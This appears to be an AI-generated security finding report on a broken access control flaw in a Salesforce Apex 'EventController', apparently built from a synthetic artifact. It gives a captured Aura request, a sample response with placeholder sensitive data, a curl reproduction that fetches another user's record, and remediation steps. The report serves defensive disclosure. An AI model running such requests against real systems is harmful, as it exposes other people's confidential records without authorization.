# Security Analysis Report
**System:** LexVault eDiscovery API (Legal Tech / Document Management) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0024 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC / Pattern 2.1 | Functional pivot — `EventController.updateEvent` enables cross-user eDiscovery event access by pivoting from read to write function |

---

## Finding 1 — Functional Pivot: Cross-User eDiscovery Event Access via `updateEvent` (CRITICAL)

### Summary
The `EventController` Apex class on LexVault eDiscovery API (`3f3233d3.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Event records. Per §5.0 Pattern 2.1, the `updateEvent` action represents a functional pivot vulnerability: the attacker pivots from their normal function (updating their own events) to accessing and modifying another user's eDiscovery event record by substituting `eventId: "00133D3"`. The server accepts the substituted ID without ownership validation. In legal tech, Event records may contain litigation timelines, case milestones, and attorney-client privileged data.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://3f3233d3.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://3f3233d3.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D3F3233D3!AR3f3233d3...
message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","params":{"eventId":"00133D3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{"actions":[{"id":"1;a","state":"SUCCESS","returnValue":{"records":[{"Id":"00133D3","Name":"Victim Event Record","OwnerId":"005VICTIM","InternalNotes__c":"CONFIDENTIAL: internal review notes","SensitiveData__c":"SSN: 000-67-5672"}]},"error":[]}]}
```

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing check | Root cause |
| §5.0 Pattern 2.1 | Vulnerability | Functional pivot — update→read cross-user | Classification |
| HAR descriptor | `c.EventController.updateEvent` | Aura action | Write-action exploited for read |
| HAR params | `eventId` | `00133D3` | Victim record |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-67-5672` | Attorney/client PII |

### Steps to Reproduce
```bash
SF_TOKEN="00D3F3233D3!AR3f3233d3..."
curl -s -X POST "https://3f3233d3.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"00133D3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# VULNERABLE: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-67-5672
```

### Remediation
1. `public with sharing class EventController {`
2. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist.
4. Validate `aura.token` server-side.
5. Legal tech: eDiscovery records may contain attorney-client privilege data — unauthorized access may constitute legal privilege violation; mandatory access audit logging required.
